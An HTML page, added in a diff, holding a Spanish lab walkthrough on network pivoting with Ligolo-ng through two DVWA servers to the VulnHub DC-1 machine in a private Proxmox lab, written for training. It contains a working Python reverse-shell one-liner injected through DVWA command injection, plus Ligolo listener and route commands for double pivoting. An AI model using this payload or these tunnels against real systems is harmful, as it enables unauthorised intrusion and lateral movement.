@@ -1,0 +1,781 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Cyberlab - Pivoting con Ligolo</title>
+    <link rel="stylesheet" href="../../insidestyles/style.css">
+</head>
+<body>
+    <nav class="navbar">
+        <a href="../index.html" class="back-link">Volver</a>
+        <div class="dropdown">
+            <button class="dropbtn">Índice</button>
+            <div class="dropdown-content">
+                <a href="#section-1">Objetivo</a><a href="#section-2">Confirguración y comprobación inicial</a><a href="#section-3">Caso práctico</a><a href="#section-4">Shell reversa y establecimiento de Ligolo-ng</a><a href="#section-5">Local Port-Forwarding con Ligolo</a><a href="#section-6">Pivotando hacia DVWA 2</a><a href="#section-7">Acceso y explotación a DC1</a><a href="#section-8">Escalada de priviledios DC1</a>
+            </div>
+        </div>
+    </nav>
+    <div class="guide-content" role="main">
+        <h1>Cyberlab - Pivoting con Ligolo</h1>
+        
+        <div class="guide-section" id="section-1">
+            <div class="tool-card">
+                <div class="tool-header">
+                    <h2 class="tool-name">Objetivo</h2>
+                </div>
+                <div class="tool-content">
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 100%">
+        <img src="img/20241215_140859_Untitled_Diagram.jpg" 
+             alt="Esquema del despliegue"
+             style="width: 100%">
+        <div class="image-caption">Esquema del despliegue</div>
+    </div>
+    
+                    
+                    <h3></h3>
+                    
+                    <p>El objetivo principo principal es utilizar Ligolo-ng para pivotar sobre las redes internas y poder explotar la máquina DC1 que no está accesible desde la máquina atacante.<br><br>El laboratorio consta de 4 máquinas.<br>- Kali Linux<br>- Ubuntu Server con DVWA levantado X2<br>- Debian 9 DC1<br><br>Para la descarga de DC1 o instalación de DVWA revisar los siguientes enlaces</p>
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    
+                    <a href="https://github.com/digininja/DVWA" target="_blank">DVWA - Guía</a>
+                    
+                    
+                    <h3></h3>
+                    
+                    
+                    <a href="https://www.vulnhub.com/entry/dc-1,292/" target="_blank">DC1 - Descarga</a>
+                    
+                    
+                    <h3></h3>
+                    
+                    <p>Este entorno se ha desplegado en un servidor privado Proxmox pero su configuración en cuanto a redes puede ser similar en otros sistemas de virtualización como VMware o VirtualBox</p>
+                    
+                    
+                    
+                </div>
+            </div>
+        </div>
+        
+        <div class="guide-section" id="section-2">
+            <div class="tool-card">
+                <div class="tool-header">
+                    <h2 class="tool-name">Confirguración y comprobación inicial</h2>
+                </div>
+                <div class="tool-content">
+                    
+                    <h3>Redes privadas en Proxmox</h3>
+                    
+                    <p>Primero vamos a ver la configuración de redes que tenemos asignada en proxmox ya que en este caso no asignamos las ip mediante DHCP sino de forma manual y además cada red es privada.<br></p>
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 100%">
+        <img src="img/20241215_141817_Screenshot_from_2024-12-15_15-17-59.png" 
+             alt=""
+             style="width: 100%">
+        
+    </div>
+    
+                    
+                    <h3></h3>
+                    
+                    <p>Observamos cuatro redes configuradas donde "vmbr0" se trata de la configurada por defecto en proxmox y es un enlace puente al router local o gateway 192.168.100.1, que proporciona acceso a internet.<br><br>Todas las maquinas conectadas a este router seran visibles entre si por lo que hemos creado 3 redes privadas más en modo puente sin asignación de IP, gateway ni nada.<br><br>Posteriormente asignamos las IP a cada maquina de forma manual.</p>
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    <p>Entonces tenemos la siguiente asignación:<br><br>- Kali con interfaces vmbr0 y vmbr1 (vmbr0 solo si queremos acceso a internet)<br>- DVWA con interfaces vmbr1 y vmbr2<br>- DVWA 2 con interfaces vmbr2 y vmbr3<br>- DC1 con interfaz vmbr3</p>
+                    
+                    
+                    
+                    <h3>Comprobación de visibilidad</h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 100%">
+        <img src="img/20241215_142534_Screenshot_from_2024-12-15_15-25-27.png" 
+             alt="La máquina kali no es capaz de ver al objetivo DC1"
+             style="width: 100%">
+        <div class="image-caption">La máquina kali no es capaz de ver al objetivo DC1</div>
+    </div>
+    
+                    
+                    <h3>Configuración en DVWA y DVWA 2</h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 70%">
+        <img src="img/20241215_143045_Screenshot_from_2024-12-15_15-30-36.png" 
+             alt="DVWA"
+             style="width: 100%">
+        <div class="image-caption">DVWA</div>
+    </div>
+    
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 70%">
+        <img src="img/20241215_143118_Screenshot_from_2024-12-15_15-31-11.png" 
+             alt="DVWA 2"
+             style="width: 100%">
+        <div class="image-caption">DVWA 2</div>
+    </div>
+    
+                    
+                    <h3>Escucha en local</h3>
+                    
+                    <p>Para terminar con su configuración necesitamos establecer un servicio de escucha en los puertos 8000 de ambas máquinas como servicio web local, es decir que solo sea accesible desde la propia máquina.</p>
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 60%">
+        <img src="img/20241215_143446_Screenshot_from_2024-12-15_15-34-42.png" 
+             alt="Añadimos la linea "Listen 127.0.0.1:8000" en ambas máquinas DVWA"
+             style="width: 100%">
+        <div class="image-caption">Añadimos la linea "Listen 127.0.0.1:8000" en ambas máquinas DVWA</div>
+    </div>
+    
+                    
+                    <h3></h3>
+                    
+                    <p>Creamos el host virtual para atender las peticiones y su contenido.</p>
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 85%">
+        <img src="img/20241215_144109_Screenshot_from_2024-12-15_15-41-00.png" 
+             alt="Creamos el archivo "001-internal.conf" en ambas máquinas"
+             style="width: 100%">
+        <div class="image-caption">Creamos el archivo "001-internal.conf" en ambas máquinas</div>
+    </div>
+    
+                    
+                    <h3></h3>
+                    <div class="code-block"><code>sudo a2ensite 001-internal.conf<br><br>sudo systemctl reload apache2</code></div>
+                    
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    <p>Creamos un documento index.html con el siguiente contenido</p>
+                    
+                    
+                    
+                    <h3></h3>
+                    <div class="code-block"><code>sudo nano index.html /var/www/internal</code></div>
+                    
+                    
+                    
+                    
+                    <h3></h3>
+                    <div class="code-block"><code><h1>SERVIDOR WEB INTERNO</h1><br><p>Servicio web solo disponible localmente desde localhost</p></code></div>
+                    
+                    
+                    
+                    
+                    <h3>Configuración DC1</h3>
+                    
+                    <p>En este caso en principio no tenemos acceso a DC1 por lo que no podemos modificar la configuración de red. <br>Podemos establecer que en la red privada vmbr3 asgine IP de forma automática y esto deberia asignarle una a DC1.  <br>Otra opción es acceder de alguna forma a la máquina como root para configurar la dirección IP.  <br><br>Sea cual sea la opción la máquina debe quedar visible para DVWA 2 y no para las demás.</p>
+                    
+                    
+                    
+                </div>
+            </div>
+        </div>
+        
+        <div class="guide-section" id="section-3">
+            <div class="tool-card">
+                <div class="tool-header">
+                    <h2 class="tool-name">Caso práctico</h2>
+                </div>
+                <div class="tool-content">
+                    
+                    <h3></h3>
+                    
+                    <p>Imagina una red corporativa como una casa grande y complicada. Tú eres un investigador de seguridad (también llamado pentester) y tu objetivo es entrar en las habitaciones más importantes de esa casa, como la sala del tesoro o la sala de control.<br><br>Para entrar en estas habitaciones secretas, no puedes simplemente abrir la puerta principal. En su lugar, tienes que encontrar caminos alternativos, como ventanas abiertas, puertas traseras o conductos de ventilación. A esto se le llama "movimiento lateral".<br><br>En el mundo de la informática, estos caminos alternativos son las vulnerabilidades en los sistemas. Cada host en la red es como una habitación, y cada vulnerabilidad es como una puerta o ventana. Al explotar estas vulnerabilidades, puedes moverte de un host a otra hasta llegar a tu objetivo final.<br><br>Ligolo es una herramienta que te ayuda a abrir estas puertas y ventanas. Es como una llave maestra que te permite crear túneles secretos entre diferentes computadoras. Estos túneles te permiten moverte de un punto a otro de la red de forma segura y discreta.<br><br>En este laboratorio, se practican estas técnicas de movimiento lateral en un entorno controlado.</p>
+                    
+                    
+                    
+                </div>
+            </div>
+        </div>
+        
+        <div class="guide-section" id="section-4">
+            <div class="tool-card">
+                <div class="tool-header">
+                    <h2 class="tool-name">Shell reversa y establecimiento de Ligolo-ng</h2>
+                </div>
+                <div class="tool-content">
+                    
+                    <h3>Shell reversa en DVWA</h3>
+                    
+                    <p>Para comenzar vamos a crear una shell reversa en nuestro punto de entrada que se trata de la primera máquina DVWA.<br><br>Para esto hacemos uso de cualquiera de las vulnerabilidades que permitan esto dentro de DVWA.<br><br>En este caso vamos a usar la inyección de comandos</p>
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 100%">
+        <img src="img/20241215_163127_Peek_2024-12-15_17-29.gif" 
+             alt=""
+             style="width: 100%">
+        
+    </div>
+    
+                    
+                    <h3></h3>
+                    <div class="code-block"><code>export RHOST="192.168.10.100";export RPORT=9000;nohup python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'&</code></div>
+                    
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    <p>Se ha añadido el nohup en el payload para poder evitar que la interfaz web se quede inactiva y que desvincule el proceso de la shell de la aplicación web<br></p>
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 70%">
+        <img src="img/20241215_164504_2024-12-15_17-44.png" 
+             alt="Enumeramos los puertos de escucha en DVWA y encontramos un servicio web y un servidor local en 8000 y 3306"
+             style="width: 100%">
+        <div class="image-caption">Enumeramos los puertos de escucha en DVWA y encontramos un servicio web y un servidor local en 8000 y 3306</div>
+    </div>
+    
+                    
+                    <h3>Transferencia Ligolo</h3>
+                    
+                    <p>Para poder acceder a los servicios anteriormente vistos necesitamos hacer un local port forwarding y para ello vamos a utilizar ligolo-ng.<br><br></p>
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    
+                    <a href="https://github.com/Nicocha30/ligolo-ng" target="_blank">Ligolo-ng en github</a>
+                    
+                    
+                    <h3></h3>
+                    
+                    <p>Descargamos la version que corresponda con la arquitectura del sistema, el agente y el proxy</p>
+                    
+                    
+                    
+                    <h3></h3>
+                    <div class="code-block"><code>tar -xzf Ligolo-ng_agent.tar.gz<br>tar -xzf Ligolo-ng_proxy.tar.gz</code></div>
+                    
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    <p>Proxy: Este es el componente que se ejecuta en tu máquina atacante (como Kali). Actúa como un servidor, esperando conexiones de los agentes. Es el punto central de tu operación de pivotaje.<br><br>Agent: Este componente se ejecuta en la máquina objetivo que deseas comprometer. Se conecta al proxy y establece un túnel seguro, permitiendo que el tráfico de tu máquina atacante sea redirigido a través de esa máquina.<br><br>Por lo tanto vamos a tranferir el agent al objetivo</p>
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 100%">
+        <img src="img/20241215_170829_Peek_2024-12-15_18-08.gif" 
+             alt=""
+             style="width: 100%">
+        
+    </div>
+    
+                    
+                </div>
+            </div>
+        </div>
+        
+        <div class="guide-section" id="section-5">
+            <div class="tool-card">
+                <div class="tool-header">
+                    <h2 class="tool-name">Local Port-Forwarding con Ligolo</h2>
+                </div>
+                <div class="tool-content">
+                    
+                    <h3>Proxy server en kali</h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 100%">
+        <img src="img/20241215_172342_2024-12-15_18-23.png" 
+             alt="Ejecutar como sudo"
+             style="width: 100%">
+        <div class="image-caption">Ejecutar como sudo</div>
+    </div>
+    
+                    
+                    <h3></h3>
+                    
+                    <p>Esto crea una consola en la que podremos manejar varias sesiones dentro de nuestro C2.<br><br>El parámetro "-selfcert" indica que cree un certificado para el protocolo TLS.<br><br>Creamos además una interfaz nueva a la que llamaremos "cha-1" o "channel-1"<br></p>
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 100%">
+        <img src="img/20241215_172551_2024-12-15_18-25.png" 
+             alt="Creamos el certificado"
+             style="width: 100%">
+        <div class="image-caption">Creamos el certificado</div>
+    </div>
+    
+                    
+                    <h3>Agente en DVWA</h3>
+                    
+                    <p>Antes de poder ejecutar el binario en el servidor hay que dar permisos de ejecución</p>
+                    
+                    
+                    
+                    <h3></h3>
+                    <div class="code-block"><code>chmod +x agent</code></div>
+                    
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    <p>Ahora si podemos establecer la conexión con el C2 usando el siguiente comando</p>
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 100%">
+        <img src="img/20241215_172909_2024-12-15_18-29.png" 
+             alt="Debemos indicar el certificado TLS que generamos antes para que acepte la conexión"
+             style="width: 100%">
+        <div class="image-caption">Debemos indicar el certificado TLS que generamos antes para que acepte la conexión</div>
+    </div>
+    
+                    
+                    <h3>Tunel hacia DVWA </h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 100%">
+        <img src="img/20241215_180605_2024-12-15_19-06.png" 
+             alt="Escribimos session y damos enter"
+             style="width: 100%">
+        <div class="image-caption">Escribimos session y damos enter</div>
+    </div>
+    
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 50%">
+        <img src="img/20241215_180711_2024-12-15_19-05.png" 
+             alt="Con ifconfig verificamos la asignación de la interfaz cha-1 a la red que DVWA tiene compartida con DVWA 2"
+             style="width: 100%">
+        <div class="image-caption">Con ifconfig verificamos la asignación de la interfaz cha-1 a la red que DVWA tiene compartida con DVWA 2</div>
+    </div>
+    
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 85%">
+        <img src="img/20241215_180822_2024-12-15_19-08.png" 
+             alt="Indicamos todo el rango al que pertenece la red entre DVWA y DVWA 2 lo transmita a traves de es interfaz e iniciamos el tunel"
+             style="width: 100%">
+        <div class="image-caption">Indicamos todo el rango al que pertenece la red entre DVWA y DVWA 2 lo transmita a traves de es interfaz e iniciamos el tunel</div>
+    </div>
+    
+                    
+                    <h3></h3>
+                    
+                    <p>Nota* <br>Si queremos redireccionar el tráfico local de la maquina DVWA para poder acceder al servicio en el puerto 8000 debemos hacer un "truco" que implementa lingolo.<br></p>
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    
+                    <a href="https://github.com/nicocha30/ligolo-ng/wiki/Localhost" target="_blank">Wiki oficial</a>
+                    
+                    
+                    <h3></h3>
+                    
+                    <p>El truco es añadir una redirección tal y como acabamos de hacer a la interfaz cha-1 pero con la ip 240.0.0.0/4<br><br>Ligolo tiene una característica integrada que te permite acceder a los puertos locales de la máquina agente conectada. Esto se logra utilizando un rango de direcciones IP especial y no utilizado: 240.0.0.0/4.<br><br>Cuando intentas acceder a una dirección IP dentro de este rango especial (por ejemplo, 240.0.0.1), Ligolo intercepta el tráfico.<br><br>En lugar de enviar el tráfico a su destino normal, Ligolo lo redirige automáticamente a la dirección IP local de la máquina agente conectada (generalmente 127.0.0.1). Esto crea efectivamente un túnel directo a los servicios locales del agente.</p>
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 85%">
+        <img src="img/20241215_181622_2024-12-15_19-16.png" 
+             alt="Ahí podemos ver la redirección añadida a cha-1"
+             style="width: 100%">
+        <div class="image-caption">Ahí podemos ver la redirección añadida a cha-1</div>
+    </div>
+    
+                    
+                    <h3></h3>
+                    
+                    <p>Si accedemos por lo tanto a la ruta donde levantamos el servicio en local</p>
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 95%">
+        <img src="img/20241215_182139_2024-12-15_19-21.png" 
+             alt="Tenemos acceso a ese servicio web"
+             style="width: 100%">
+        <div class="image-caption">Tenemos acceso a ese servicio web</div>
+    </div>
+    
+                    
+                </div>
+            </div>
+        </div>
+        
+        <div class="guide-section" id="section-6">
+            <div class="tool-card">
+                <div class="tool-header">
+                    <h2 class="tool-name">Pivotando hacia DVWA 2</h2>
+                </div>
+                <div class="tool-content">
+                    
+                    <h3></h3>
+                    
+                    <p>Ahora que ya tenemos creado el tunel hacia DVWA signifca que tenemos acceso a toda la red que comparte con DVWA 2 y, por lo tanto que podemos acceder a los servicios que ofrece DVWA 2.<br><br>Recordad que el tunel y la redirección ya esta activo y asignado por lo que ahora desde nuestro kali todo lo que hagamos apuntando a 192.168.15.0/24 pasará por el tunel hacia DVWA por lo que se hará en su red.</p>
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 100%">
+        <img src="img/20241215_183914_Peek_2024-12-15_19-39.gif" 
+             alt="Observamos que hay dos IP dentro de la red la 15.10 pertenece a DVWA y la 15.20 pertenece a DVWA 2"
+             style="width: 100%">
+        <div class="image-caption">Observamos que hay dos IP dentro de la red la 15.10 pertenece a DVWA y la 15.20 pertenece a DVWA 2</div>
+    </div>
+    
+                    
+                    <h3></h3>
+                    
+                    <p>Sabiendo esto podemos por lo tanto acceder al servicio en el puerto 80 de DVWA 2</p>
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 100%">
+        <img src="img/20241215_191450_Peek_2024-12-15_20-14.gif" 
+             alt="Lo dejamos preparado para volver a inyectar el payload"
+             style="width: 100%">
+        <div class="image-caption">Lo dejamos preparado para volver a inyectar el payload</div>
+    </div>
+    
+                    
+                    <h3>Redirección doble desde DVWA </h3>
+                    
+                    <p>Para hacer un doble pivot con Ligolo-ng, necesitaremos crear una segunda interfaz tun como la primera. Puedes llamarla como quieras. Nosotros la llamamos cha-2.</p>
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 60%">
+        <img src="img/20241215_203755_2024-12-15_21-37.png" 
+             alt=""
+             style="width: 100%">
+        
+    </div>
+    
+                    
+                    <h3></h3>
+                    
+                    <p>El siguiente paso es agregar un listener en el puerto 11601 a la sesión existente de Ligolo-ng y redirigirlo a nuestra máquina.</p>
+                    
+                    
+                    
+                    <h3></h3>
+                    <div class="code-block"><code>listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp</code></div>
+                    
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 100%">
+        <img src="img/20241215_204025_2024-12-15_21-40.png" 
+             alt="Como resultado, podemos usar el agente en la máquina DVWA para conectarnos nuevamente a Ligolo-ng y establecer una nueva sesión, esta vez en la máquina DVWA 2, lo que nos permitirá acceder a la red 192.168.20.0/24"
+             style="width: 100%">
+        <div class="image-caption">Como resultado, podemos usar el agente en la máquina DVWA para conectarnos nuevamente a Ligolo-ng y establecer una nueva sesión, esta vez en la máquina DVWA 2, lo que nos permitirá acceder a la red 192.168.20.0/24</div>
+    </div>
+    
+                    
+                    <h3>Conexión desde DVWA 2</h3>
+                    
+                    <p>Necesitamos el agente en DVWA 2 así que volvemos a su interfaz en 192.168.15.20 puerto 80 para inyectar los comandos que necesitamos</p>
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 100%">
+        <img src="img/20241215_210343_Peek_2024-12-15_22-03.gif" 
+             alt="Descargamos el agente desde DVWA a DVWA 2"
+             style="width: 100%">
+        <div class="image-caption">Descargamos el agente desde DVWA a DVWA 2</div>
+    </div>
+    
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 60%">
+        <img src="img/20241215_210512_2024-12-15_22-04.png" 
+             alt="Damos los permisos de ejecución necesarios"
+             style="width: 100%">
+        <div class="image-caption">Damos los permisos de ejecución necesarios</div>
+    </div>
+    
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 100%">
+        <img src="img/20241215_210924_Peek_2024-12-15_22-09.gif" 
+             alt="Ejecutamos la conexion hacia el agente DVWA que a su vez será redireccionadio hacia la conexión en kali"
+             style="width: 100%">
+        <div class="image-caption">Ejecutamos la conexion hacia el agente DVWA que a su vez será redireccionadio hacia la conexión en kali</div>
+    </div>
+    
+                    
+                    <h3>Establecer el tunel hacia DVWA 2</h3>
+                    
+                    <p>Nuestro paso final es cambiar nuestra sesión al segundo punto de pivote (DVWA 2), iniciar el túnel y luego agregar una ruta a la nueva red 192.168.20.0/24.</p>
+                    
+                    
+                    
+                    <h3></h3>
+                    <div class="code-block"><code>sudo ip route add 192.168.20.0/24 dev cha-2</code></div>
+                    
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 85%">
+        <img src="img/20241215_214026_2024-12-15_22-40.png" 
+             alt=""
+             style="width: 100%">
+        
+    </div>
+    
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 100%">
+        <img src="img/20241215_211625_2024-12-15_22-16.png" 
+             alt="Iniciamos el tunel hacia DVWA 2"
+             style="width: 100%">
+        <div class="image-caption">Iniciamos el tunel hacia DVWA 2</div>
+    </div>
+    
+                    
+                </div>
+            </div>
+        </div>
+        
+        <div class="guide-section" id="section-7">
+            <div class="tool-card">
+                <div class="tool-header">
+                    <h2 class="tool-name">Acceso y explotación a DC1</h2>
+                </div>
+                <div class="tool-content">
+                    
+                    <h3>Localización</h3>
+                    
+                    <p>Para poder localizar el objetivo DC1 haremos un escaneo de host</p>
+                    
+                    
+                    
+                    <h3></h3>
+                    <div class="code-block"><code>nmap -F 192.168.20.0-50</code></div>
+                    
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 100%">
+        <img src="img/20241215_214327_Peek_2024-12-15_22-42.gif" 
+             alt="Vemos dos hosts DVWA 2 y DC1"
+             style="width: 100%">
+        <div class="image-caption">Vemos dos hosts DVWA 2 y DC1</div>
+    </div>
+    
+                    
+                    <h3>Explotación </h3>
+                    
+                    <p>Tenemos el camino y vemos al objetivo, vamos a explotarlo.<br><br>Como ya sabemos DC1 cuenta con un servicio web Drupal que es vulnerable por lo que vamos a buscarlo en metasploit.</p>
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 100%">
+        <img src="img/20241215_215949_Peek_2024-12-15_22-59.gif" 
+             alt=""
+             style="width: 100%">
+        
+    </div>
+    
+                    
+                    <h3></h3>
+                    
+                    <p>Indicamos que la shell vaya hacia la ip de DVWA 2 a través del puerto 11601 y esta viajará a traves del tunel que hemos creado pivotando 2 veces sobre dos máquinas diferentes.<br><br>A tener en cuenta es que si intentamos escuchar directamente sobre el puerto 11601 desde nuestra kali dirá que está ocupado por lo que debemos antes asignar esa misma dirección de esucha a otro puerto de nuestra máquina como el 4444</p>
+                    
+                    
+                    
+                    <h3></h3>
+                    <div class="code-block"><code>listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:4444 --tcp </code></div>
+                    
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 100%">
+        <img src="img/20241215_220441_2024-12-15_23-04.png" 
+             alt=""
+             style="width: 100%">
+        
+    </div>
+    
+                    
+                </div>
+            </div>
+        </div>
+        
+        <div class="guide-section" id="section-8">
+            <div class="tool-card">
+                <div class="tool-header">
+                    <h2 class="tool-name">Escalada de priviledios DC1</h2>
+                </div>
+                <div class="tool-content">
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 100%">
+        <img src="img/20241215_231331_Peek_2024-12-16_00-13.gif" 
+             alt=""
+             style="width: 100%">
+        
+    </div>
+    
+                    
+                </div>
+            </div>
+        </div>
+        
+    </div>
+    <footer class="guide-footer">
+        &copy; 2024 Documentación Labs/CTF 
+    </footer>
+</body>
+</html>
